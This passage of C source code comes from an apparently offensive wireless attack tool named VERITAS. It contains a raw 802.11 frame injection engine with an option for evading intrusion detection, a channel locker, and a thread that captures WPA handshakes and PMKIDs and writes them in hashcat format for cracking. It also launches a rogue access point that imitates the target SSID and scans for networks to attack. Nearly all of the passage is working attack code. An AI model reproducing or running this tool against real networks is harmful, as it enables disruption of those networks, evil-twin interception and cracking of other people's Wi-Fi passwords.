    if (!a->ids_bypass && burst >= 4) {
      pkt_t batch[BATCH_SIZE];
      int bcount = 0;
      for (int i = 0; i < burst && bcount < BATCH_SIZE; i++) {
        pkt_t *src = a->pkts.p[idx % a->pkts.n];
        memcpy(&batch[bcount], src, sizeof(pkt_t));

        
        if (batch[bcount].len >
            (int)(sizeof(rt_hdr_t) + offsetof(dot11_t, seq) + 2)) {
          dot11_t *dot = (dot11_t *)(batch[bcount].buf + sizeof(rt_hdr_t));
          dot->seq = htole16((++seq) << 4);
        }
        bcount++;
        idx++;
      }

      int sent = inject_batch(sock, batch, bcount);
      if (sent > 0) {
        atomic_fetch_add(&g_pkts_sent, (uint64_t)sent);
        local_sent += (uint64_t)sent;
        if (sent < bcount)
          atomic_fetch_add(&g_pkts_fail, (uint64_t)(bcount - sent));
      } else {
        atomic_fetch_add(&g_pkts_fail, (uint64_t)bcount);
      }
    } else {
      for (int i = 0; i < burst && !g_stop; i++) {
        pkt_t *p = a->pkts.p[idx % a->pkts.n];
        idx++;

        uint8_t tmp[MAX_PKT_SIZE];
        memcpy(tmp, p->buf, (size_t)p->len);
        if (p->len > (int)(sizeof(rt_hdr_t) + sizeof(dot11_t))) {
          dot11_t *dot = (dot11_t *)(tmp + sizeof(rt_hdr_t));
          dot->seq = htole16((++seq) << 4);
        }

        int r = inject_one(sock, tmp, p->len);
        if (r > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          local_sent++;
        } else
          atomic_fetch_add(&g_pkts_fail, 1);

        if (a->ids_bypass) {
          double jitter = 0.0005 + (double)(xs64_next(&rng) % 1500) / 1e6;
          usleep_precise(jitter);
        }
      }
    }

    double sl = rate_sleep(&rate, local_sent);
    if (sl > 0)
      usleep_precise(sl);
  }

  close(sock);
  free(a);
  return NULL;
}

typedef struct {
  config_t *cfg;
  factory_t *fac;
  pthread_t thr[VEC_COUNT * 2];
  int nthr;
} engine_t;

static void engine_init(engine_t *e, config_t *c, factory_t *f) {
  e->cfg = c;
  e->fac = f;
  e->nthr = 0;
}

/* [FIX 13] Count threads first, then create with checked pthread_create */
static void engine_start(engine_t *e) {
  
  int planned = 0;
  for (int v = 0; v < VEC_COUNT; v++) {
    if (!e->cfg->vec_on[v])
      continue;
    pkt_set_t ps = factory_get(e->fac, (attack_vector_t)v);
    if (ps.n == 0)
      continue;
    planned++;
    if (e->cfg->dual_radio && e->cfg->iface2[0])
      planned++;
  }
  g_total_threads = planned > 0 ? planned : 1;

  int tid = 0;
  for (int v = 0; v < VEC_COUNT; v++) {
    if (!e->cfg->vec_on[v])
      continue;
    pkt_set_t ps = factory_get(e->fac, (attack_vector_t)v);
    if (ps.n == 0)
      continue;

    inj_arg_t *a = calloc(1, sizeof(*a));
    a->pkts = ps;
    a->iface = e->cfg->iface;
    a->mode = e->cfg->mode;
    a->ids_bypass = e->cfg->ids_bypass;
    a->thread_id = tid++;
    a->total_threads = g_total_threads;

    /* [FIX 13] Check pthread_create */
    pthread_t t;
    if (pthread_create(&t, NULL, inject_thread, a) == 0) {
      e->thr[e->nthr++] = t;
    } else {
      fprintf(stderr, "  " C_YELLOW "[!] Thread create failed for %s" RST "\n",
              VEC_NAMES[v]);
      free(a);
    }

    if (e->cfg->dual_radio && e->cfg->iface2[0]) {
      inj_arg_t *a2 = calloc(1, sizeof(*a2));
      a2->pkts = ps;
      a2->iface = e->cfg->iface2;
      a2->mode = e->cfg->mode;
      a2->ids_bypass = e->cfg->ids_bypass;
      a2->thread_id = tid++;
      a2->total_threads = g_total_threads;

      pthread_t t2;
      if (pthread_create(&t2, NULL, inject_thread, a2) == 0) {
        e->thr[e->nthr++] = t2;
      } else {
        fprintf(stderr,
                "  " C_YELLOW "[!] Thread create failed (dual) for %s" RST "\n",
                VEC_NAMES[v]);
        free(a2);
      }
    }
  }
}

static void engine_stop(engine_t *e) {
  g_stop = 1;
  for (int i = 0; i < e->nthr; i++)
    pthread_join(e->thr[i], NULL);
}

/* ============================================================
 *               CHANNEL LOCKER
 * ============================================================ */

/* [FIX 33] set_ch via fork/execlp — no system() */
static int set_ch(const char *iface, int ch) {
  char ch_str[8];
  snprintf(ch_str, sizeof(ch_str), "%d", ch);

  pid_t pid = fork();
  if (pid == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 2);
      close(dn);
    }
    execlp("iw", "iw", "dev", iface, "set", "channel", ch_str, NULL);
    _exit(127);
  }
  if (pid < 0)
    return -1;

  int status;
  waitpid(pid, &status, 0);

  if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
    /* [FIX 34,45] Check for DFS/regulatory failure */
    if (is_dfs_ch(ch)) {
      fprintf(stderr,
              "  " C_YELLOW "[!] Channel %d is DFS — may require CAC" RST "\n",
              ch);
    }
    if (ch >= 149 && ch <= 165) {
      fprintf(stderr,
              "  " C_YELLOW "[!] Channel %d may be blocked by regulatory "
              "domain (check: iw reg get)" RST "\n",
              ch);
    }
    return -1;
  }
  return 0;
}

typedef struct {
  char iface[MAX_IFACE];
  char iface2[MAX_IFACE];
  int ch;
  bool dual;
  bool rogue_on_iface2; /* [FIX: don't lock iface2 if rogue AP uses it] */
} ch_arg_t;

static void *ch_lock_thread(void *arg) {
  ch_arg_t *a = (ch_arg_t *)arg;
  while (!g_stop) {
    set_ch(a->iface, a->ch);
    
    if (a->dual && a->iface2[0] && !a->rogue_on_iface2)
      set_ch(a->iface2, a->ch);
    usleep_precise(1.5);
  }
  free(a);
  return NULL;
}

static pthread_t start_ch_lock(const config_t *c, int ch) {
  ch_arg_t *a = calloc(1, sizeof(*a));
  snprintf(a->iface, MAX_IFACE, "%s", c->iface);
  snprintf(a->iface2, MAX_IFACE, "%s", c->iface2);
  a->ch = ch;
  a->dual = c->dual_radio;
  a->rogue_on_iface2 = c->spawn_rogue && c->iface2[0];
  pthread_t t;
  pthread_create(&t, NULL, ch_lock_thread, a);
  return t;
}

/* ============================================================
 *               PMKID CAPTURE
 * ============================================================ */

typedef struct {
  char iface[MAX_IFACE];
  bool active;
  char target_bssid[MAX_MAC_STR];     /* [FIX 22] */
  char target_ssid[MAX_SSID_LEN + 1]; /* [FIX 25] for hashcat */
} cap_arg_t;

#ifndef PACKET_IGNORE_OUTGOING
#define PACKET_IGNORE_OUTGOING 23
#endif

static void *capture_thread(void *arg) {
  cap_arg_t *a = (cap_arg_t *)arg;
  int sock = raw_socket(a->iface);
  if (sock < 0) {
    free(a);
    return NULL;
  }

  struct timeval tv = {.tv_sec = 1};
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

  /* [FIX 21] Ignore our own outgoing packets */
  int iogo = 1;
  setsockopt(sock, SOL_PACKET, PACKET_IGNORE_OUTGOING, &iogo, sizeof(iogo));

  uint8_t target_bss[6] = {0};
  if (a->target_bssid[0])
    parse_mac(a->target_bssid, target_bss);

  uint8_t buf[4096];
  while (!g_stop) {
    ssize_t n = recv(sock, buf, sizeof(buf), 0);
    if (n <= 40 || !a->active)
      continue;

    for (ssize_t i = 0; i < n - 5; i++) {
      if (buf[i] != 0x88 || buf[i + 1] != 0x8E)
        continue;

      /* [FIX 24] Safe unaligned read for radiotap length */
      uint16_t rt_len = 0;
      memcpy(&rt_len, buf + 2, 2);
      rt_len = le16toh(rt_len);

      if (rt_len >= (uint16_t)i || rt_len + sizeof(dot11_t) > (size_t)n)
        break;

      dot11_t *d = (dot11_t *)(buf + rt_len);

      /* [FIX 22] Filter to target BSSID (a3 = BSSID in most mgmt/data) */
      char frame_bssid[MAX_MAC_STR];
      format_mac(d->a3, frame_bssid);
      if (a->target_bssid[0] && memcmp(d->a3, target_bss, 6) != 0)
        break; 

      /* [UPGRADE] Check if it's an EAPOL packet (any of M1-M4) */
      
      ssize_t eapol_start = i + 2; 
      if (eapol_start + 4 + 2 < n) {
        
        char pcap_name[128];
        time_t now = time(NULL);
        struct tm *tm = localtime(&now);
        snprintf(pcap_name, sizeof(pcap_name),
                 "./out/veritas_handshake_%04d%02d%02d.pcap", tm->tm_year + 1900,
                 tm->tm_mon + 1, tm->tm_mday);

        FILE *fp = fopen(pcap_name, "ab"); 
        if (fp) {
          
          fseek(fp, 0, SEEK_END);
          if (ftell(fp) == 0) {
            pcap_hdr_t ph = {
                .magic_number = 0xa1b2c3d4,
                .version_major = 2,
                .version_minor = 4,
                .thiszone = 0,
                .sigfigs = 0,
                .snaplen = 65535,
                .network = 105 
            };
            fwrite(&ph, sizeof(ph), 1, fp);
          }

          struct timeval pcap_tv;
          gettimeofday(&pcap_tv, NULL);
          
          
          pcaprec_hdr_t pr = {
              .ts_sec = (uint32_t)pcap_tv.tv_sec,
              .ts_usec = (uint32_t)pcap_tv.tv_usec,
              .incl_len = (uint32_t)n,
              .orig_len = (uint32_t)n
          };

          fwrite(&pr, sizeof(pr), 1, fp);
          fwrite(buf, 1, n, fp);
          fclose(fp);
          
          fprintf(stderr, "  " C_GREEN "[PCAP]" RST " Saved EAPOL frame to %s\n", pcap_name);
        }
      }

      /* [FIX 2] Search for PMKID KDE (for Hashcat .22000 output as bonus) */
      for (ssize_t j = i; j < n - 22; j++) {
        if (buf[j] == 0xDD && buf[j + 1] == 0x14 && buf[j + 2] == 0x00 &&
            buf[j + 3] == 0x0F && buf[j + 4] == 0xAC &&
            buf[j + 5] == 0x04) { /* [FIX 2] check KDE type */

          char pmkid_hex[33];
          for (int k = 0; k < 16 && j + 6 + k < n;
               k++) /* [FIX 2] read from j+6 */
            snprintf(pmkid_hex + k * 2, 3, "%02x", buf[j + 6 + k]);

          /* [FIX 25] Output in hashcat 22000 format */
          char ap_mac_clean[13], cli_mac_clean[13], ssid_hex[65];
          snprintf(ap_mac_clean, 13, "%02x%02x%02x%02x%02x%02x", d->a3[0],
                   d->a3[1], d->a3[2], d->a3[3], d->a3[4], d->a3[5]);
          snprintf(cli_mac_clean, 13, "%02x%02x%02x%02x%02x%02x", d->a1[0],
                   d->a1[1], d->a1[2], d->a1[3], d->a1[4], d->a1[5]);
          ssid_to_hex(a->target_ssid, ssid_hex, sizeof(ssid_hex));

          char fname[128];
          time_t now = time(NULL);
          struct tm *tm = localtime(&now);
          snprintf(fname, sizeof(fname),
                   "./out/veritas_pmkid_%04d%02d%02d.22000", tm->tm_year + 1900,
                   tm->tm_mon + 1, tm->tm_mday);
          FILE *fp = fopen(fname, "a");
          if (fp) {
            fprintf(fp, "WPA*01*%s*%s*%s*%s\n", pmkid_hex, ap_mac_clean,
                    cli_mac_clean, ssid_hex);
            fclose(fp);
          }
          fprintf(stderr, "  " C_GREEN "[PMKID] Captured from %s → %s" RST "\n",
                  frame_bssid, fname);
          break;
        }
      }
      break;
    }
  }
  close(sock);
  free(a);
  return NULL;
}

/* [FIX 22] Pass target info to capture thread */
static pthread_t start_capture(const config_t *c, const target_ap_t *t) {
  cap_arg_t *a = calloc(1, sizeof(*a));
  snprintf(a->iface, MAX_IFACE, "%s", c->iface);
  a->active = c->log_pmkid;
  snprintf(a->target_bssid, MAX_MAC_STR, "%s", t->bssid);
  snprintf(a->target_ssid, MAX_SSID_LEN + 1, "%s", t->ssid);
  pthread_t th;
  pthread_create(&th, NULL, capture_thread, a);
  return th;
}

/* ============================================================
 *               ROGUE AP
 * ============================================================ */

static pid_t g_rogue = -1;
static char g_rogue_iface[MAX_IFACE] = "";

/* [FIX 27,28,44] Proper rogue AP with interface mode switch and 5GHz support */
static void start_rogue(const config_t *c, const target_ap_t *t) {
  if (!c->spawn_rogue)
    return;
  char ssid[40];
  if (c->rogue_ssid[0])
    snprintf(ssid, sizeof(ssid), "%s", c->rogue_ssid);
  else
    snprintf(ssid, sizeof(ssid), "%s_5G", t->ssid);

  const char *ifc = c->iface2[0] ? c->iface2 : c->iface;
  snprintf(g_rogue_iface, MAX_IFACE, "%s", ifc);

  /* [FIX 27] Switch interface to AP mode */
  char cmd_down[128], cmd_type[128], cmd_up[128];
  snprintf(cmd_down, sizeof(cmd_down), "ip link set %s down 2>/dev/null", ifc);
  snprintf(cmd_type, sizeof(cmd_type), "iw dev %s set type __ap 2>/dev/null",
           ifc);
  snprintf(cmd_up, sizeof(cmd_up), "ip link set %s up 2>/dev/null", ifc);
  if (system(cmd_down)) {
  }
  if (system(cmd_type)) {
  }
  if (system(cmd_up)) {
  }

  char path[128];
  snprintf(path, sizeof(path), "./out/veritas_rogue_%ld.conf", (long)time(NULL));
  FILE *fp = fopen(path, "w");
  if (!fp)
    return;

  /* [FIX 28,44] 5GHz VHT config */
  if (c->new_ch >= 36) {
    fprintf(fp,
            "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=a\nchannel=%d\n"
            "ieee80211n=1\nieee80211ac=1\n"
            "wpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\n"
            "rsn_pairwise=CCMP\n",
            ifc, ssid, c->new_ch);
  } else {
    fprintf(fp,
            "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%d\n"
            "ieee80211n=1\n"
            "wpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\n"
            "rsn_pairwise=CCMP\n",
            ifc, ssid, c->new_ch);
  }
  fclose(fp);

  pid_t p = fork();
  if (p == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 1);
      dup2(dn, 2);
      close(dn);
    }
    execlp("hostapd", "hostapd", path, NULL);
    _exit(1);
  }
  if (p > 0) {
    g_rogue = p;
    fprintf(stderr, "  " C_GREEN "[✓] Rogue AP '%s' on ch %d" RST "\n", ssid,
            c->new_ch);
  }
}

/* [FIX 29] Blocking waitpid for clean zombie reap */
static void stop_rogue(const char *iface2) {
  (void)iface2;
  if (g_rogue > 0) {
    kill(g_rogue, SIGTERM);
    /* [FIX 29] Wait up to 3 seconds for clean exit */
    for (int i = 0; i < 6; i++) {
      int status;
      pid_t r = waitpid(g_rogue, &status, WNOHANG);
      if (r > 0)
        break;
      usleep_precise(0.5);
    }
    waitpid(g_rogue, NULL, 0); 
    g_rogue = -1;

    
    if (g_rogue_iface[0]) {
      char cmd[128];
      snprintf(cmd, sizeof(cmd), "ip link set %s down 2>/dev/null",
               g_rogue_iface);
      if (system(cmd)) {
      }
      snprintf(cmd, sizeof(cmd), "iw dev %s set type monitor 2>/dev/null",
               g_rogue_iface);
      if (system(cmd)) {
      }
      snprintf(cmd, sizeof(cmd), "ip link set %s up 2>/dev/null",
               g_rogue_iface);
      if (system(cmd)) {
      }
      g_rogue_iface[0] = '\0';
    }
  }
}

/* ============================================================
 *               DISPLAY ENGINE
 * ============================================================ */

typedef struct {
  config_t *cfg;
  target_ap_t *tgt;
  double refresh;
  char stats[MAX_PATH_LEN];
} disp_arg_t;

static void *display_thread(void *arg) {
  disp_arg_t *d = (disp_arg_t *)arg;
  double last_stats_write = 0; /* [FIX 37] throttle */

  printf("\033[?25l\033[2J\033[H");
  fflush(stdout);

  while (!g_stop) {
    double now = mono_time();
    double elapsed = now - g_start_time;
    int h = (int)(elapsed / 3600), m = (int)(fmod(elapsed, 3600) / 60),
        s = (int)(fmod(elapsed, 60));

    uint64_t sent = atomic_load(&g_pkts_sent);
    uint64_t fail = atomic_load(&g_pkts_fail);
    uint64_t total = sent + fail;
    double pps = elapsed > 0.05 ? (double)sent / elapsed : 0;
    double sc = total > 0 ? (double)sent / total * 100.0 : 100.0;

    int tw, th;
    get_term_size(&tw, &th);
    (void)tw;

    printf("\033[H");

    printf("  " C_DEEP_B "╔══════════════════════════════════════════════╗" RST
           "\n");
    printf("  ║" C_ICE BLD
           "     VERITAS v4.4 — ACTIVE SESSION          " RST C_DEEP_B "║" RST
           "\n");
    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
           "\n");
    printf("  ║ " C_GRAY "IF  " RST C_CYAN "%-40s" RST " ║\033[K\n",
           d->cfg->iface);
    printf("  ║ " C_GRAY "BSS " RST C_ICE "%-40s" RST " ║\033[K\n",
           d->tgt->bssid);
    printf("  ║ " C_GRAY "SSID" RST " " C_WHITE "%-40s" RST "║\033[K\n",
           d->tgt->ssid);
    printf("  ║ " C_GRAY "CH  " RST C_RED "%d" RST " → " C_GREEN "%d" RST
           "  " C_GRAY "MODE" RST " " C_CYAN "%s" RST
           "%s               ║\033[K\n",
           d->tgt->channel, d->cfg->new_ch, MODE_NAMES[d->cfg->mode],
           d->cfg->dual_radio ? " DUAL" : "");
    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
           "\n");

    printf("  ║ " C_GRAY "TX    " RST C_AQUA "%-12lu" RST "  " C_GRAY
           "FAIL " RST "%s%-8lu" RST "     ║\033[K\n",
           (unsigned long)sent, fail > 0 ? C_RED : C_GRAY, (unsigned long)fail);

    char pps_str[32];
    if (pps >= 1000)
      snprintf(pps_str, sizeof(pps_str), "%.1fK pps", pps / 1000);
    else
      snprintf(pps_str, sizeof(pps_str), "%.0f pps", pps);

    /* [FIX 38] Renamed from "HIT" to "TX OK" */
    printf("  ║ " C_GRAY "RATE  " RST C_ICE "%-14s" RST C_GRAY "TX OK" RST
           " %s%.1f%%" RST "       ║\033[K\n",
           pps_str, sc >= 99 ? C_GREEN : (sc >= 90 ? C_YELLOW : C_RED), sc);
    printf("  ║ " C_GRAY "TIME  " RST C_CYAN "%02d:%02d:%02d" RST
           "                                ║\033[K\n",
           h, m, s);

    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
           "\n");
    int vline = 0;
    for (int v = 0; v < VEC_COUNT && vline < th - 16; v++) {
      if (!d->cfg->vec_on[v])
        continue;
      printf("  ║ " C_GREEN "▸" RST " %-42s║\033[K\n", VEC_NAMES[v]);
      vline++;
    }
    printf("  " C_DEEP_B "╚══════════════════════════════════════════════╝" RST
           "\n");
    printf("  " C_DIM_GRAY "[" C_RED "Ctrl+C" RST C_DIM_GRAY "]" RST
           " stop   " C_GRAY "TX:" RST C_AQUA "%lu" RST "  " C_GRAY "%s" RST
           "  " C_GRAY "%.0f%%" RST "\n",
           (unsigned long)sent, pps_str, sc);
    printf("\033[J");
    fflush(stdout);

    /* [FIX 37] Stats file write throttled to 1Hz */
    if (d->stats[0] && (now - last_stats_write) >= 1.0) {
      last_stats_write = now;
      FILE *fp = fopen(d->stats, "w");
      if (fp) {
        fprintf(fp,
                "{\"ts\":%.1f,\"elapsed\":%.1f,\"sent\":%lu,\"fail\":%lu,"
                "\"pps\":%.1f,\"tx_ok\":%.1f,\"bssid\":\"%s\",\"ssid\":\"%s\","
                "\"ch\":%d,\"mode\":\"%s\"}\n",
                (double)time(NULL), elapsed, (unsigned long)sent,
                (unsigned long)fail, pps, sc, d->tgt->bssid, d->tgt->ssid,
                d->tgt->channel, MODE_NAMES[d->cfg->mode]);
        fclose(fp);
      }
    }

    usleep_precise(d->refresh);
  }
  free(d);
  return NULL;
}

static pthread_t start_display(config_t *c, target_ap_t *t, double rate,
                               const char *sf) {
  disp_arg_t *a = calloc(1, sizeof(*a));
  a->cfg = c;
  a->tgt = t;
  a->refresh = rate > 0.05 ? rate : 0.1;
  if (sf)
    snprintf(a->stats, MAX_PATH_LEN, "%s", sf);
  pthread_t th;
  pthread_create(&th, NULL, display_thread, a);
  return th;
}

/* ============================================================
 *               SCANNER
 * ============================================================ */

static int detect_mon_ifaces(char out[][MAX_IFACE], int max) {
  int n = 0;
  FILE *fp = popen("iw dev 2>/dev/null", "r");
  if (!fp)
    return 0;
  char line[256], cur[MAX_IFACE] = "";
  while (fgets(line, sizeof(line), fp) && n < max) {
    char *p = line;
    while (*p == ' ' || *p == '\t')
      p++;
    char *nl = strchr(p, '\n');
    if (nl)
      *nl = 0;
    if (strncmp(p, "Interface ", 10) == 0)
      snprintf(cur, MAX_IFACE, "%s", p + 10);
    else if (strncmp(p, "type ", 5) == 0 && cur[0]) {
      if (strcmp(p + 5, "monitor") == 0)
        snprintf(out[n++], MAX_IFACE, "%s", cur);
      cur[0] = 0;
    }
  }
  pclose(fp);
  return n;
}

/* [FIX 42] Scanner with band option */
static int scan_aps(const char *iface, int dur, target_ap_t *aps, int max,
                    const char *band) {
  int cnt = 0;
  char tmpdir[128];
  snprintf(tmpdir, sizeof(tmpdir), "./out/vrt_scan_XXXXXX");
  if (!mkdtemp(tmpdir))
    return 0;
  char pfx[200];
  snprintf(pfx, sizeof(pfx), "%s/s", tmpdir);

  pid_t pid = fork();
  if (pid == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 1);
      dup2(dn, 2);
      close(dn);
    }
    /* [FIX 42] Pass band to airodump-ng */
    if (band && band[0])
      execlp("airodump-ng", "airodump-ng", iface, "--band", band, "-w", pfx,
             "--output-format", "csv", "--write-interval", "1", NULL);
    else
      execlp("airodump-ng", "airodump-ng", iface, "-w", pfx, "--output-format",
             "csv", "--write-interval", "1", NULL);
    _exit(1);
  }
  if (pid < 0)
    return 0;

  for (int i = 0; i < dur && !g_stop; i++) {
    int bw = 30, fl = (i + 1) * bw / dur;
    printf("\r  " C_GRAY "[" RST);
    for (int j = 0; j < bw; j++)
      printf(j < fl ? C_BLUE "█" RST : C_DIM_GRAY "░" RST);
    printf(C_GRAY "]" RST " " C_ICE "%d/%ds" RST " %s", i + 1, dur,
           band ? band : "bg");
    fflush(stdout);
    sleep(1);
  }
  printf("\n");
  kill(pid, SIGTERM);
  waitpid(pid, NULL, 0);

  char csv[220];
  snprintf(csv, sizeof(csv), "%s-01.csv", pfx);
  FILE *fp = fopen(csv, "r");
  if (!fp)
    goto cleanup;

  char line[1024];
  bool in_ap = false;
  while (fgets(line, sizeof(line), fp) && cnt < max) {
    char *nl = strchr(line, '\n');
    if (nl)
      *nl = 0;
    if (!line[0])
      continue;
    if (strncmp(line, "BSSID", 5) == 0) {
      in_ap = true;
      continue;
    }
    if (strncmp(line, "Station", 7) == 0)
      break;
    if (!in_ap)
      continue;

    char fld[20][128];
    int nf = 0;
    char *t = line;
    while (nf < 20) {
      char *c = strchr(t, ',');
      int l = c ? (int)(c - t) : (int)strlen(t);
      if (l > 127)
        l = 127;
      memcpy(fld[nf], t, l);
      fld[nf][l] = 0;
      char *s = fld[nf];
      while (*s == ' ')
        memmove(s, s + 1, strlen(s));
      char *e = s + strlen(s) - 1;
      while (e > s && *e == ' ')
        *e-- = 0;
      nf++;
      if (!c)
        break;
      t = c + 1;
    }
    if (nf < 11 || !valid_mac(fld[0]))
      continue;

    /* [FIX 35] Only use fld[13] when nf >= 14 */
    char *essid = "";
    if (nf >= 14)
      essid = fld[13];
    if (!essid[0])
      essid = "<hidden>";

    snprintf(aps[cnt].bssid, MAX_MAC_STR, "%.17s", fld[0]);
    snprintf(aps[cnt].ssid, MAX_SSID_LEN + 1, "%.32s", essid);
    aps[cnt].channel = nf > 3 ? atoi(fld[3]) : 1;
    if (aps[cnt].channel < 1)
      aps[cnt].channel = 1;
    aps[cnt].power = nf > 8 ? atoi(fld[8]) : -100;
    if (nf > 5)
      snprintf(aps[cnt].encryption, 16, "%.15s", fld[5]);
    cnt++;
  }
  fclose(fp);

  for (int i = 0; i < cnt - 1; i++)
    for (int j = i + 1; j < cnt; j++)
      if (aps[j].power > aps[i].power) {
        target_ap_t tmp = aps[i];
        aps[i] = aps[j];
        aps[j] = tmp;
      }

cleanup: {
  char pat[220];
  snprintf(pat, sizeof(pat), "%s*", pfx);
  glob_t g;
  if (glob(pat, 0, NULL, &g) == 0) {
    for (size_t i = 0; i < g.gl_pathc; i++)
      remove(g.gl_pathv[i]);
    globfree(&g);
  }
  rmdir(tmpdir);
}
  return cnt;
}

/* ============================================================
 *               EXIT SUMMARY
 * ============================================================ */

/* [FIX 38,39] Proper exit with both ifaces restored */
static void print_summary(const config_t *cfg, const target_ap_t *t) {
  printf("\033[?25h\033[2J\033[H");

  double elapsed = mono_time() - g_start_time;
  uint64_t sent = atomic_load(&g_pkts_sent);
  uint64_t fail = atomic_load(&g_pkts_fail);
  uint64_t total = sent + fail;
  double sc = total > 0 ? (double)sent / total * 100.0 : 0;
  double pps = elapsed > 0 ? (double)sent / elapsed : 0;

  printf("\n  " C_DEEP_B "╔══════════════════════════════════════════════╗" RST
         "\n");
  printf("  ║" C_AQUA BLD
         "         SESSION COMPLETE                    " RST C_DEEP_B "║" RST
         "\n");
  printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
         "\n");
  printf("  ║ " C_GRAY "Interface " RST "  " C_CYAN "%-34s" RST "║\n",
         cfg->iface);
  printf("  ║ " C_GRAY "Target    " RST "  " C_ICE "%-34s" RST "║\n", t->bssid);
  printf("  ║ " C_GRAY "SSID      " RST "  " C_WHITE "%-34s" RST "║\n",
         t->ssid);
  printf("  ║ " C_GRAY "Channel   " RST "  " C_RED "%d" RST " → " C_GREEN
         "%d" RST "                              ║\n",
         t->channel, cfg->new_ch);
  printf("  ║ " C_GRAY "Duration  " RST "  " C_ICE "%02d:%02d:%02d" RST
         "                          ║\n",
         (int)(elapsed / 3600), (int)(fmod(elapsed, 3600) / 60),
         (int)(fmod(elapsed, 60)));
  printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
         "\n");
  printf("  ║ " C_GRAY "Packets   " RST "  " C_AQUA "%-34lu" RST "║\n",
         (unsigned long)sent);
  printf("  ║ " C_GRAY "Rate      " RST "  " C_ICE "%.1f pps" RST
         "                          ║\n",
         pps);
  printf("  ║ " C_GRAY "TX OK     " RST "  %s%.1f%%" RST /* [FIX 38] */
         "                              ║\n",
         sc >= 90 ? C_GREEN : C_RED, sc);
  printf("  ║ " C_GRAY "Failures  " RST "  %s%-34lu" RST "║\n",
         fail > 0 ? C_RED : C_GRAY, (unsigned long)fail);
  printf("  " C_DEEP_B "╚══════════════════════════════════════════════╝" RST
         "\n\n");

  /* [FIX 39] Restore both interfaces */
  set_ch(cfg->iface, t->channel);
  if (cfg->dual_radio && cfg->iface2[0])
    set_ch(cfg->iface2, t->channel);
}

/* ============================================================
 *               SIGNAL HANDLER / PREFLIGHT
 * ============================================================ */

static void sig_handler(int s) {
  (void)s;
  g_stop = 1;
}

static bool preflight(void) {
  printf("\n  " C_CYAN BLD "[*] System check..." RST "\n\n");
  struct {
    const char *name;
    bool crit;
  } tools[] = {
      {"iw", true},
      {"airodump-ng", false},
      {"hostapd", false},
  };
  bool ok = true;
  if (getuid() != 0) {
    printf("  " C_RED "[✗] ROOT" RST " ... FAIL\n");
    return false;
  }
  printf("  " C_GREEN "[✓]" RST " ROOT        ... OK\n");

  for (int i = 0; i < 3; i++) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "which %s >/dev/null 2>&1", tools[i].name);
    bool found = system(cmd) == 0;
    char upper[32];
    snprintf(upper, sizeof(upper), "%s", tools[i].name);
    for (char *p = upper; *p; p++)
      *p = toupper(*p);
    if (found)
      printf("  " C_GREEN "[✓]" RST " %-11s ... OK\n", upper);
    else {
      printf("  %s[%s]" RST " %-11s ... %s\n", tools[i].crit ? C_RED : C_YELLOW,
             tools[i].crit ? "✗" : "⚠", upper, tools[i].crit ? "FAIL" : "WARN");
      if (tools[i].crit)
        ok = false;
    }
  }
  printf("\n");
  return ok;
}

/* ============================================================
 *               INPUT HELPERS / MENUS
 * ============================================================ */

static void input_prompt(const char *prompt, char *out, int sz,
                         bool (*vf)(const char *), const char *err,
                         const char *def) {
  while (1) {
    printf("  " C_ELECTRIC "▸" RST " " C_CYAN "%s" RST, prompt);
    if (def && def[0])
      printf(" " C_GRAY "[%s]" RST, def);
    printf(": ");
    fflush(stdout);
    char buf[256];
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    char *nl = strchr(buf, '\n');
    if (nl)
      *nl = 0;
    char *p = buf;
    while (*p == ' ')
      p++;
    if (!*p && def && def[0])
      p = (char *)def;
    if (!*p || (vf && !vf(p))) {
      printf("     " C_RED "✗ %s" RST "\n", err);
      continue;
    }
    snprintf(out, (size_t)sz, "%.*s", sz - 1, p);
    return;
  }
}

static bool vmc(const char *s) { return valid_mac(s); }
static bool vch(const char *s) { return valid_ch(atoi(s)); }

static void menu_iface(char *out, int sz) {
  if (out && out[0] != '\0') return;
  printf("\n  " C_CYAN BLD "Interface Selection" RST "\n\n");
  char ifs[16][MAX_IFACE];
  int n = detect_mon_ifaces(ifs, 16);
  if (n == 0) {
    input_prompt("Monitor interface", out, sz, NULL, "Required", "");
    return;
  }
  for (int i = 0; i < n; i++)
    printf("  " C_CYAN "%d" RST ". %s\n", i + 1, ifs[i]);
  printf("\n");
  if (n == 1) {
    snprintf(out, sz, "%s", ifs[0]);
    printf("  Auto: %s\n\n", ifs[0]);
    return;
  }
  while (1) {
    char buf[16];
    printf("  Select [1-%d]: ", n);
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    int s = atoi(buf);
    if (s >= 1 && s <= n) {
      snprintf(out, sz, "%s", ifs[s - 1]);
      return;
    }
  }
}

/* [FIX 42] menu_target with band selection */
static void menu_target(const char *iface, target_ap_t *t) {
  printf("\n  " C_CYAN BLD "Target Acquisition" RST "\n\n");
  char buf[32];
  printf("  Scan APs? " C_AQUA "(Y/n)" RST ": ");
  fflush(stdout);
  if (!fgets(buf, sizeof(buf), stdin))
    exit(0);

  target_ap_t aps[MAX_APS];
  int n = 0;
  if (buf[0] != 'n' && buf[0] != 'N') {
    /* [FIX 42] Ask for band */
    char band[8] = "abg";
    printf("  Band " C_GRAY "[abg=all, bg=2.4, a=5]" RST " " C_GRAY "[abg]" RST
           ": ");
    fflush(stdout);
    char bbuf[16];
    if (fgets(bbuf, sizeof(bbuf), stdin)) {
      char *nl = strchr(bbuf, '\n');
      if (nl)
        *nl = 0;
      char *p = bbuf;
      while (*p == ' ')
        p++;
      if (*p)
